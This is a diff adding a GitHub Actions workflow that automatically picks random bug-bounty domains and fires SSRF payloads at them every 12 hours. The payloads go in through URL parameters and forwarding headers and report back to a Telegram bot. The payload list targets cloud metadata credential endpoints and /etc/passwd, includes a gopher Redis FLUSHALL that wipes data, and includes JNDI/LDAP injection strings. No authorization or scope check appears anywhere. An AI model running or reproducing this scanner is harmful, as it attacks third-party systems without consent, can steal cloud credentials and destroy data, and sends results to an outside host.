@@ -1,0 +1,162 @@
+name: Automated SSRF Hunter
+
+on:
+  schedule:
+    - cron: '0 */12 * * *'  # Runs every 12 hours
+  workflow_dispatch:  # Allows manual triggering
+
+env:
+  OUTPUT_DIR: 'ssrf-results'
+  GO111MODULE: on
+  TARGETS_URL: 'https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt'
+
+jobs:
+  ssrf-hunting:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Setup Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3-pip wget jq git
+
+      - name: Install Tools
+        run: |
+          # Install Go tools
+          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          go install -v github.com/tomnomnom/qsreplace@latest
+          go install -v github.com/tomnomnom/anew@latest
+          go install -v github.com/lc/gau/v2/cmd/gau@latest
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+      - name: Setup SSRF Resources
+        run: |
+          mkdir -p wordlists/ssrf
+          
+          # Generate unique identifier for this scan
+          SCAN_ID=$(date +%s)
+          echo "SCAN_ID=$SCAN_ID" >> $GITHUB_ENV
+          
+          # Create Telegram callback URL
+          TELEGRAM_CALLBACK="https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage?chat_id=${{ secrets.TELEGRAM_CHAT_ID }}&text=SSRF_CALLBACK_${SCAN_ID}:"
+          
+          # Create SSRF payloads with Telegram callback
+          cat > wordlists/ssrf/payloads.txt << EOL
+          http://${TELEGRAM_CALLBACK}TARGET
+          https://${TELEGRAM_CALLBACK}TARGET
+          //${TELEGRAM_CALLBACK}TARGET
+          ${TELEGRAM_CALLBACK}TARGET
+          //google.com@${TELEGRAM_CALLBACK}TARGET
+          http://169.254.169.254/latest/meta-data/${TELEGRAM_CALLBACK}
+          http://metadata.google.internal/computeMetadata/v1/${TELEGRAM_CALLBACK}
+          http://169.254.169.254/latest/user-data/${TELEGRAM_CALLBACK}
+          http://metadata.google.internal/computeMetadata/v1/instance/${TELEGRAM_CALLBACK}
+          http://100.100.100.200/latest/meta-data/${TELEGRAM_CALLBACK}
+          http://127.0.0.1:80/${TELEGRAM_CALLBACK}
+          http://localhost:22/${TELEGRAM_CALLBACK}
+          file:///etc/passwd${TELEGRAM_CALLBACK}
+          dict://localhost:11211/${TELEGRAM_CALLBACK}
+          gopher://localhost:6379/_FLUSHALL%0D%0A${TELEGRAM_CALLBACK}
+          ${TELEGRAM_CALLBACK}\${jndi:ldap://callback/a}
+          ${TELEGRAM_CALLBACK}\${sys:java.version}
+          EOL
+          
+          # Replace TARGET with URL encoding placeholder
+          sed -i "s/TARGET/%URL%/g" wordlists/ssrf/payloads.txt
+
+      - name: Select Random Target
+        id: target
+        run: |
+          wget -q ${{ env.TARGETS_URL }} -O wildcards.txt
+          TARGET=$(shuf -n 1 wildcards.txt | sed 's/^\*\.//')
+          echo "target=$TARGET" >> $GITHUB_OUTPUT
+          
+          START_MSG="🔍 Starting SSRF Scan%0A%0ATarget: $TARGET%0ATime: $(date '+%Y-%m-%d %H:%M:%S UTC')"
+          curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d "text=$START_MSG" \
+            -d "parse_mode=HTML"
+
+      - name: URL Discovery
+        run: |
+          mkdir -p ${{ env.OUTPUT_DIR }}/{urls,parameters,results}
+          
+          # Gather URLs focusing on potential SSRF endpoints
+          subfinder -d ${{ steps.target.outputs.target }} -silent | httpx -silent | tee ${{ env.OUTPUT_DIR }}/urls/live_domains.txt
+          
+          # Use multiple tools for URL discovery
+          cat ${{ env.OUTPUT_DIR }}/urls/live_domains.txt | while read domain; do
+            # Historical URLs
+            gau --subs $domain >> ${{ env.OUTPUT_DIR }}/urls/raw_urls.txt
+            
+            # Crawl for URLs
+            katana -u $domain -d 5 -jc -ef css,png,jpg,gif >> ${{ env.OUTPUT_DIR }}/urls/raw_urls.txt
+          done
+          
+          # Filter potential SSRF endpoints
+          cat ${{ env.OUTPUT_DIR }}/urls/raw_urls.txt | grep -iE "url=|redirect=|path=|src=|dest=|uri=|link=|location=|file=|reference=|site=|html=|data=|page=|feed=|host=|port=|to=|out=|view=|dir=|show=|navigation=|open=|next=|callback=|return=|load=|continue=|fetch=|download=|upload=|proxy=|target=" > ${{ env.OUTPUT_DIR }}/urls/potential_ssrf.txt
+
+      - name: SSRF Testing
+        run: |
+          mkdir -p ${{ env.OUTPUT_DIR }}/results
+          
+          # 1. Test with Nuclei SSRF templates
+          nuclei -l ${{ env.OUTPUT_DIR }}/urls/potential_ssrf.txt \
+            -t nuclei-templates/vulnerabilities/ssrf/ \
+            -o ${{ env.OUTPUT_DIR }}/results/nuclei_ssrf.txt
+          
+          # 2. Test with custom payloads
+          cat ${{ env.OUTPUT_DIR }}/urls/potential_ssrf.txt | while read url; do
+            # URL encode the target for callback
+            ENCODED_URL=$(echo "$url" | jq -sRr @uri)
+            
+            for payload in $(cat wordlists/ssrf/payloads.txt); do
+              # Replace URL placeholder with encoded URL
+              FINAL_PAYLOAD=$(echo "$payload" | sed "s/%URL%/$ENCODED_URL/g")
+              
+              # URL parameter injection
+              echo "$url" | qsreplace "$FINAL_PAYLOAD" | while read injection_url; do
+                curl -sk "$injection_url" \
+                  -H "User-Agent: SSRF-Test/$url" \
+                  -H "X-Scan-ID: ${{ env.SCAN_ID }}" \
+                  >> ${{ env.OUTPUT_DIR }}/results/ssrf_attempts.txt
+              done
+              
+              # Header injection tests
+              for header in "X-Forwarded-For" "X-Forwarded-Host" "X-Original-URL" "X-Rewrite-URL" "X-Custom-IP-Authorization" "X-Host" "X-Remote-IP" "X-Client-IP" "X-Server" "X-HTTP-Host-Override" "Forwarded" "X-Api-Url" "X-Original-Host" "X-Backend-URL"; do
+                curl -sk "$url" \
+                  -H "$header: $FINAL_PAYLOAD" \
+                  -H "User-Agent: SSRF-Test-Header/$url/$header" \
+                  -H "X-Scan-ID: ${{ env.SCAN_ID }}" \
+                  >> ${{ env.OUTPUT_DIR }}/results/ssrf_header_attempts.txt
+              done
+            done
+          done
+
+      - name: Upload Results
+        uses: actions/upload-artifact@v3
+        with:
+          name: ssrf-scan-results
+          path: ${{ env.OUTPUT_DIR }}
+
+      - name: Send Results
+        if: always()
+        run: |
+          TOTAL_ATTEMPTS=$(wc -l < "${{ env.OUTPUT_DIR }}/results/ssrf_attempts.txt" || echo "0")
+          NUCLEI_FINDINGS=$(grep -c "SSRF" "${{ env.OUTPUT_DIR }}/results/nuclei_ssrf.txt" || echo "0")
+          
+          COMPLETE_MSG="✅ SSRF Scan Complete%0A%0ATarget: ${{ steps.target.outputs.target }}%0AScan ID: ${{ env.SCAN_ID }}%0ATotal Tests: $TOTAL_ATTEMPTS%0ANuclei Findings: $NUCLEI_FINDINGS%0ATime: $(date '+%Y-%m-%d %H:%M:%S UTC')%0A%0AMonitor this chat for callbacks!"
+          
+          curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d "text=$COMPLETE_MSG" \
+            -d "parse_mode=HTML" 
